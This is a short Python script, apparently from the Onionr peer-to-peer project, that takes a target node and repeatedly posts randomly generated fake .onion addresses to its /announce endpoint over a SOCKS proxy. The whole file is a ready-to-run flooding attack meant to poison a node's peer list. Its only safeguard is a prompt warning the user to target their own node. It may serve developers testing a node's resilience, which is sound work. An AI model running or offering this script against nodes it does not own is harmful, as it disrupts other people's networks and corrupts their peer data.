import sys
import os
import secrets
import base64
os.chdir('../')
sys.path.append("src/")
from onionrutils import stringvalidators
from onionrutils import basicrequests


def random_tor_generator():
    return base64.b32encode(secrets.token_bytes(35)).decode().replace("=", "").lower() + ".onion"

node = input("Enter node to attack. Note that you legally must use your own, and even that might lead to technical or legal issues")
assert stringvalidators.validate_transport(node)

count = int(input("Attack amount: "))
port = input("Socks:")
for x in range(count):
    new = random_tor_generator()
    print(f"Introducing {new} to {node}")
    basicrequests.do_post_request(
                    f'http://{node}/announce',
                    data = {'node': new},
                    port=port)
